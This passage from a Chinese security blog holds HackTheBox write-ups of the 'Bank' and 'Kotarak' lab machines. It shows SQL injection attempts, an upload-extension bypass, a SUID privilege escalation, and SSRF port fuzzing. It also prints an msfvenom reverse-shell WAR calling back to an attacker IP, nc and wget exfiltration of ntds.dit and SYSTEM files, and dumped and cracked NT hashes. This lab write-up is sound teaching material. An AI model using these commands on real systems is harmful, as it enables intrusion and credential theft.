class="hljs-number">6</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">a8:</span><span class="hljs-symbol">fd:</span>07<span class="hljs-symbol">:fe</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:eb</span><span class="hljs-symbol">:</span><span class="hljs-number">88</span><span class="hljs-symbol">:d5</span><span class="hljs-symbol">:</span><span class="hljs-number">16</span><span class="hljs-symbol">:</span><span class="hljs-number">65</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">2</span><span class="hljs-symbol">d:</span><span class="hljs-number">79</span><span class="hljs-symbol">:</span><span class="hljs-number">44</span><span class="hljs-symbol">:</span><span class="hljs-number">30</span><span class="hljs-symbol">:c8</span><span class="hljs-symbol">:bb</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span>07<span class="hljs-symbol">:cf</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">b:</span><span class="hljs-number">72</span><span class="hljs-symbol">:ef</span><span class="hljs-symbol">:a1</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">d:</span><span class="hljs-number">67</span> (ED25519)<br><span class="hljs-number">53</span>/tcp open  domain  ISC BIND <span class="hljs-number">9.9</span>.<span class="hljs-number">5</span><span class="hljs-number">-3</span>ubuntu0.<span class="hljs-number">14</span> (Ubuntu Linux)<br>| dns-<span class="hljs-symbol">nsid:</span> <br>|_  <span class="hljs-symbol">bind.version:</span> <span class="hljs-number">9.9</span>.<span class="hljs-number">5</span><span class="hljs-number">-3</span>ubuntu0.<span class="hljs-number">14</span>-Ubuntu<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">7</span> ((Ubuntu))<br>|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">7</span> (Ubuntu)<br>|_http-<span class="hljs-symbol">title:</span> Apache2 Ubuntu Default <span class="hljs-symbol">Page:</span> It works<br><span class="hljs-number">53</span>/udp open   domain  ISC BIND <span class="hljs-number">9.9</span>.<span class="hljs-number">5</span><span class="hljs-number">-3</span>ubuntu0.<span class="hljs-number">14</span> (Ubuntu Linux)<br>| dns-<span class="hljs-symbol">nsid:</span> <br>|_  <span class="hljs-symbol">bind.version:</span> <span class="hljs-number">9.9</span>.<span class="hljs-number">5</span><span class="hljs-number">-3</span>ubuntu0.<span class="hljs-number">14</span>-Ubuntu<br><br>os： ubuntu<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>只有一个web apache默认配置页面</p><h2 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h2><p>burp抓包，将Host: 10.10.10.29，替换为Host: bank.htb<br>可以发现</p><p>echo 10.10.10.29 bank.htb &gt;&gt; /etc/hosts</p><hr><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/23.PNG" alt="23"></p><h2 id="try1-目录扫描"><a href="#try1-目录扫描" class="headerlink" title="try1 - 目录扫描"></a>try1 - 目录扫描</h2><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">gobuster</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br>/<span class="hljs-selector-tag">uploads</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br>/<span class="hljs-selector-tag">assets</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br>/<span class="hljs-selector-tag">inc</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br></code></pre></div></td></tr></table></figure><p>当访问/uploads时候，发现是403 forbidden，而不是301。<br>burp repeater发现是gobuster结果不准确。</p><p>访问assets，发现一些没什么用的css文件。</p><p>/inc发现</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/4.PNG" alt="4"></p><h2 id="zone-transfer"><a href="#zone-transfer" class="headerlink" title="zone transfer"></a>zone transfer</h2><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">echo <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.29</span> chris.bank.htb &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br>echo <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.29</span> ns.bank.htb &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br>echo <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.29</span> www.bank.htb &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/2.PNG" alt="2"></p><h2 id="try2-sql注入"><a href="#try2-sql注入" class="headerlink" title="try2 - sql注入"></a>try2 - sql注入</h2><p>admin’ or ‘1’=’1<br>密码随意，提示口令和数据库查询不匹配，可以联想到sql注入</p><p>burp intruder，测试用户名/密码，payload都试过，但没有报错。也许有延时注入。。谁知道呢</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/3.PNG" alt="3"></p><h2 id="try3-域名检查"><a href="#try3-域名检查" class="headerlink" title="try3- 域名检查"></a>try3- 域名检查</h2><p>三个域名都是apache默认配置页面</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>balance-transfer</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/5.PNG" alt="5"></p><p>当时没有扫描出这个目录。。给我的启示是，要等gobuster 100%扫描结束后再开始做，免得遗漏重点，却在不重要的地方反复检查，浪费时间。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Email</span>: <span class="hljs-number">1</span>xlwRvs<span class="hljs-number">9</span>vMzOmq<span class="hljs-number">8</span>H<span class="hljs-number">3</span>G<span class="hljs-number">5</span>npUroI<span class="hljs-number">9</span>iySrrTZNpQiS<span class="hljs-number">0</span>OFzD<span class="hljs-number">20</span>LK<span class="hljs-number">4</span>rPsRJTfs<span class="hljs-number">3</span>y<span class="hljs-number">1</span>VZsPYffOy<span class="hljs-number">7</span>PnMo<span class="hljs-number">0</span>PoLzsdpU<span class="hljs-number">49</span>OkCSSDOR<span class="hljs-number">6</span>DPmSEUZtiMSiCg<span class="hljs-number">3</span>bJgAElKsFmlxZ<span class="hljs-number">9</span>p<span class="hljs-number">5</span>MfrE<br><span class="hljs-attribute">Password</span>: TmEnErfX<span class="hljs-number">3</span>w<span class="hljs-number">0</span>fghQUCAniWIQWRf<span class="hljs-number">1</span>DutioQWMvo<span class="hljs-number">2</span>srytHOKxJn<span class="hljs-number">76</span>G<span class="hljs-number">4</span>Ow<span class="hljs-number">0</span>GM<span class="hljs-number">2</span>jgvCFmzrRXtkp<span class="hljs-number">2</span>N<span class="hljs-number">6</span>RyDAWLGCPv<span class="hljs-number">9</span>PbVRvbn<span class="hljs-number">7</span>RKGjBENW<span class="hljs-number">3</span>PJaHiOhezYRpt<span class="hljs-number">0</span>fEV<span class="hljs-number">797</span>uhZfXi<br></code></pre></div></td></tr></table></figure><p>发现口令，并且加密过了。检查一下长度，128位，于是搜索“md5 在线破解”<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/6.PNG" alt="6"></p><p>检查结果，检查加密方式失败。。</p><hr><p>复制源码，grep反向搜索，找到一个长度为257的文件。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/7.PNG" alt="7"></p><p>于是打开它，发现口令没有加密<br><a href="http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc">http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc</a></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>You cant upload this this file. You can upload only img.</p><p>然而查看源码发现，.htb作为后缀可以作为php脚本被执行。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">view-source:http://bank.htb/support.php<br><span class="hljs-comment">&lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/1.PNG" alt="1"></p><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -4000 2&gt;/</span>dev/<span class="hljs-keyword">null</span> &gt; examSUID.txt<br><br><span class="hljs-keyword">file</span> <span class="hljs-regexp">/var/</span>htb<span class="hljs-regexp">/bin/</span>emergency<br><span class="hljs-regexp">/var/</span>htb<span class="hljs-regexp">/bin/</span>emergency: setuid ELF <span class="hljs-number">32</span>-bit LSB  shared object, Intel <span class="hljs-number">80386</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked (uses shared libs), <span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">24</span>, BuildID[sha1]=<span class="hljs-number">1</span>fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped<br><br><br>cd <span class="hljs-regexp">/var/</span>htb<span class="hljs-regexp">/bin; ./</span>emergency<br></code></pre></div></td></tr></table></figure><p>找到suid程序，运行一下，即可获得root权限</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说好不玩CTF呢</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-31-10/%E4%B8%8B%E8%BD%BD.jpg" alt="下载"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kotarak（从ssrf到提权-ntds-dit提取密码）</title>
    <link href="/2019/05/25/07-x/"/>
    <url>/2019/05/25/07-x/</url>
    
    <content type="html"><![CDATA[<p>本文首发于<a href="https://xz.aliyun.com/t/5266">先知社区</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hackthebox是一个在线的渗透平台，通过渗透获取邀请码，即可在这个平台上注册一个账号。</p><p>该平台的在线靶机一共20台，每周会下线一台靶机，如果靶机下线了呢，分数就会全部清空。而成功渗透靶机就能获取一定的分数，分数够了就能提升等级。</p><p>在线的靶机都是没有writeup的，所以你的等级很大程度可以证明你的渗透实战能力。</p><p>该平台一共7个用户等级，刚注册是等级Noob：</p><ol><li>Noob 无知者</li><li>script kiddle 脚本小子 </li><li>hacker 黑客</li><li>Pro hacker 专业黑客</li><li>Elite Hacker 精英黑客</li><li>Guru 大师</li><li>Omniscient （最高等级）无所不知者</li></ol><p>靶机的分数为20-50分</p><ol><li>20分-easy 简单</li><li>30分-medium 中等难度</li><li>40分-hard 困难的</li><li>50分-Insane 疯狂的</li></ol><p>下面介绍关于过期的机器<strong>kotarak</strong>的渗透过程，难度等级为hard。</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>用masscan与Nmap工具分别输入以下指令:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>,U:<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.10.55</span> --rate=<span class="hljs-number">1000</span> -e tun<span class="hljs-number">0</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>,U:<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> &gt; ports<br><br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -sU -sT -p$ports <span class="hljs-number">10.10.10.55</span><br></code></pre></div></td></tr></table></figure><p>扫描结果提示，22、8080、8009以及60000端口开放。</p><h2 id="8080web探测"><a href="#8080web探测" class="headerlink" title="8080web探测"></a>8080web探测</h2><p>首先访问<a href="http://10.10.10.55:8080，显示HTTP">http://10.10.10.55:8080，显示HTTP</a> Status 404 - /，状态码404 not found。于是枚举目录。</p><blockquote><p>dirb <a href="http://10.10.10.55:8080/">http://10.10.10.55:8080</a> </p></blockquote><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/docs (CODE:**<span class="hljs-number">302</span>**|SIZE:<span class="hljs-number">0</span>)<br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/examples (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)                         <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/favicon.ico (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">21630</span>)                   <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/host-manager (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)                     <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/manager (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><p>发现基本上都是302重定向。</p><p>于是访问下 <a href="http://10.10.10.55:8080/manager">http://10.10.10.55:8080/manager</a></p><p>发现302重定向到<a href="http://10.10.10.55:8080/manager/">http://10.10.10.55:8080/manager/</a> </p><p>并且状态码是404。但是404页面有个提示，tomcat 7重构并且有些urls已经改变。所有使用管理应用的urls现在应该使用如下选项：</p><blockquote><p>/manager/html for the HTML GUI<br>/manager/text for the text interface<br>/manager/jmxproxy for the JMX proxy<br> /manager/status for the status pages</p></blockquote><p>我们就按照所说的访问一下。发现所给的urls都需要登陆才能访问。</p><p>再搜索下 Apache Tomcat 8.5.5。<a href="http://blog.csdn.net/posonrick/article/details/72566875">参考</a></p><p>tomcat是java web服务器</p><p>尝试访问：<a href="http://10.10.10.55:8080/index.jsp">http://10.10.10.55:8080/index.jsp</a> ，200ok。</p><h2 id="60000端口-web探测"><a href="#60000端口-web探测" class="headerlink" title="60000端口-web探测"></a>60000端口-web探测</h2><h3 id="SSRF-服务端请求伪造"><a href="#SSRF-服务端请求伪造" class="headerlink" title="SSRF-服务端请求伪造"></a>SSRF-服务端请求伪造</h3><p>没有经验的小白先跟whale学习下。<br>该漏洞经常出现在服务端，一些web应用程序经常从其他server获取信息。</p><blockquote><p>客户端 （去B服务器取回图片 !）——》A服务端（执行）————》B服务器（返回图片）————》A服务器（执行完毕）————》客户端（收到图片）</p></blockquote><h4 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h4><blockquote><p>客户端（去扫描B服务器 ！）——》A服务端（执行）————》B服务器（返回数据包）————》A服务器（执行完毕）————》客户端（收到扫描结果）</p></blockquote><p>服务器没有过滤客户端的请求。本来设计的功能想法是好的，但是攻击者不打算<strong>以设计者的想法</strong>来使用这个功能。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/1.PNG" alt="1"></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">使用这个私人的web浏览器匿名在网络冲浪，请不要滥用它。<br></code></pre></div></td></tr></table></figure><ul><li><p>Trying</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">python</span> -m SimpleHTTPServer<br><span class="hljs-symbol">ifconfig</span><br>在本地开启服务器，查看本地<span class="hljs-built_in">ip</span>。<br></code></pre></div></td></tr></table></figure><p>尝试用浏览器上的该功能访问下本地，是否成功。<br>输入<code>http://本地ip：8000</code><br>浏览器跳转到一个地址<code>http://10.10.10.55:60000/url.php?path=http://本地ip:8000</code><br>成功访问客户端本地地址。</p></li><li><p>Trying</p></li></ul><p>然后尝试ssrf，提交<code>file:///etc/passwd</code><br>返回<code>try harder </code><br>尝试File FIlE  ,同样的返回结果。说明目标机可能用正则表达式限制了file这个字符。</p><ul><li>Trying<br>尝试<code>http://localhost:60000</code>  返60000端口上的正常页面。<br>因为端口扫描那一步<strong>客户端访问都是302重定向</strong>，需要登陆才能访问，于是我们通过60000端口上的“搜索”功能，绕过对客户端的限制。让服务器替我们获取想要的信息。</li></ul><h1 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h1><ul><li>这是一个web扫描软件<br>可以用<code>wfuzz -h</code> 查看使用方式<br>我们使用下列参数，扫描服务器开放的端口<br><code>wfuzz -c -z range,1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</code></li></ul><p>图片中，2 Ch是响应的字符串，访问后发现没有任何有价值的东西，于是我们忽略它。<br><code>wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</code><br>扫描后，我们得到了非2 Ch的响应结果。<br>看到了很多端口信息，因为<strong>客户端nmap扫描是远程访问</strong>，有 防火墙等等，所以在这里会得到更加详细的（在远程扫描不到的）端口信息。</p><ul><li><p> trying<br>一个一个访问这些开放了的端口，<code>http://10.10.10.55:60000/url.php?path=http://localhost:端口</code><br>在888端口，找到了一个备份页面backup。</p></li><li><p>Trying</p></li></ul><p><code>http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/7.PNG" alt="7"></p><p>得到了可能是tomcat配置文件中的用户名密码。</p><p>（有一个小技巧，在端口扫描那一步，得到了不能访问的文件名，可以用ssrf去访问，来获取敏感文件。）</p><p>我们用这个口令登陆端口扫描那一步获得的地址<code>manager/html</code></p><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a><strong>获取shell</strong></h4><p>刚刚通过ssrf获取敏感文件，从而突破防线，接下来，我们要获取一个shell。</p><p>因为主页面上有上传功能，提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">deploy <span class="hljs-built_in">directory</span> <span class="hljs-keyword">or</span> WAR <span class="hljs-built_in">file</span> located <span class="hljs-keyword">on</span> <span class="hljs-title">server</span>.<br>war <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> deploy <br>select war <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> upload.<br></code></pre></div></td></tr></table></figure><p>暗示了我们可以上传一个war类型的反弹shell。</p><blockquote><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=1234 -f war &gt; ippsec.war</p></blockquote><p><code>War——web归档文件，war文件用于封装web模块。web模块可以代表一个独立的web应用程序。</code></p><ul><li>Trying</li></ul><p>成功上传——本地nc监听80端口<code>nc -lnvp 1234</code>——浏览器访问payload地址，即可获得一个shell。</p><ul><li>shell中运行</li></ul><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 于是获得一个bash shell。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/12.PNG" alt="12"></p><ul><li>find . -name “user.txt” 2&gt;/dev/null<br><code>/home/atanas/user.txt</code> 无读取选项</li></ul><h2 id="用户提权"><a href="#用户提权" class="headerlink" title="用户提权"></a>用户提权</h2><p>经过之前步骤，我们获得了一个tomcat用户权限的shell，可以看到有一些文件是不允许访问的。接下来看看如何获取root权限。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/8.PNG"></p><p><code>cd /home/tomcat/to_archive/pentest_data</code></p><p>在用户家目录下，发现一个ntds.dit文件。以前没做过域渗透，(⊙﹏⊙)稍微去了解了下，ntds.dit即目录数据库，用于windows域。</p><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>将那两个文件用nc发送到攻击机本地</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span>:   nc -lvnp <span class="hljs-number">443</span> &gt; SYSTEM<br><span class="hljs-attribute">shell</span>:  nc <span class="hljs-number">10.10.14.5</span> <span class="hljs-number">443</span> &lt;  <span class="hljs-number">20170721114637</span>_default_<span class="hljs-number">192.168.110.133</span>_psexec.ntdsgrab._<span class="hljs-number">089134</span>.bin<br><span class="hljs-attribute">kali</span>:   file<br></code></pre></div></td></tr></table></figure><p>同样的方式，把另一个文件用ntds.dit作为文件名传送到本地</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>发现nc传输，当文件大时，十分不方便</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/2.PNG" alt="2"></p><p>远程shell：python -m SimpleHTTPServer 7788<br>本地kali：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://<span class="hljs-number">10.10.10.55:7788</span>/<span class="hljs-number">20170721114637</span>_default_<span class="hljs-number">192.168.110.133</span>_psexec.ntdsgrab._<span class="hljs-number">089134</span>.bin<br><span class="hljs-attribute">wget</span> http://<span class="hljs-number">10.10.10.55:7788</span>/<span class="hljs-number">20170721114636</span>_default_<span class="hljs-number">192.168.110.133</span>_psexec.ntdsgrab._<span class="hljs-number">333512</span>.dit<br></code></pre></div></td></tr></table></figure><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>简而言之，下面的工具就是用来提取目录数据库中保存的hash的。</p><h4 id="libesedb"><a href="#libesedb" class="headerlink" title="libesedb"></a>libesedb</h4><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/libyal/libesedb.git<br><span class="hljs-keyword">cd</span> libesedb/<br><br>apt-<span class="hljs-built_in">get</span> install git autoconf automake autopoint libtool pkg-config build-essential<br><br>./synclibs.<span class="hljs-keyword">sh</span><br>./autogen.<span class="hljs-keyword">sh</span><br>./configure 将源代码编译<br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br>ldconfig<br></code></pre></div></td></tr></table></figure><h4 id="ntdsxtract"><a href="#ntdsxtract" class="headerlink" title="ntdsxtract"></a>ntdsxtract</h4><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/csababarta/ntdsxtract<br><span class="hljs-keyword">cd</span> ntdsxtract<br><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> build &amp;&amp; <span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install<br></code></pre></div></td></tr></table></figure><h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><p><a href="https://blog.didierstevens.com/2016/07/30/video-ntds-dit-extract-hashes-with-secretsdump-py/">video:提取hash</a></p><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">esedbexport -m tables ntds.dit <br>该命令运行后，会生成一个文件夹，ntds.dit.export<br><br>cd ntds.dit.export;ls<br>可以查看生成了一些文件，注意datatable.3、link_table.5<br><br>文件绝对路径: <br>1. /root/Desktop/10.10.10.55/ntds.dit.export/datatable.3<br>2. /root/Desktop/10.10.10.55/ntds.dit.export/link_table.5<br>3. 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin<br>重命名为SYSTEM<br><br>dsusers.py 路径1 路径2 hashdump（生成的文件夹名称） --syshive 文件3 --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc<br><br>最终的命令<br>dsusers.py /root/Desktop/10.10.10.55/ntds.dit.export/datatable.3 /root/Desktop/10.10.10.55/ntds.dit.export/link_table.5 hashdump --syshive SYSTEM --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc<br><br>在生成的文件夹hashdump，可以找到ntout.txt<br><br>ntout.txt的内容如下<br>Administrator:::e64fe0f24ba2489c05e64354d74ebd11:S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1036816736</span><span class="hljs-string">-4081296861</span><span class="hljs-string">-1938768537</span><span class="hljs-string">-500</span>::<br>krbtgt:::ca1ccefcb525db49828fbb9d68298eee:S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1036816736</span><span class="hljs-string">-4081296861</span><span class="hljs-string">-1938768537</span><span class="hljs-string">-502</span>::<br>atanas:::2b576acbe6bcfda7294d6bd18041b8fe:S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1036816736</span><span class="hljs-string">-4081296861</span><span class="hljs-string">-1938768537</span><span class="hljs-string">-1108</span>::<br></code></pre></div></td></tr></table></figure><p>复制2b576acbe6bcfda7294d6bd18041b8fe，在在线密码破解网站<a href="https://crackstation.net/">https://crackstation.net/</a></p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>Administrator</td><td>f16tomcat!</td></tr><tr><td>atanas</td><td>Password123!</td></tr><tr><td>krbtgt</td><td>破解失败</td></tr></tbody></table><p><code>su atanas</code></p><p>用<code>atanas</code>作为用户名，<code>f16tomcat!</code>作为密码，成功获得atanas用户权限</p><p>获得user flag<code>cat 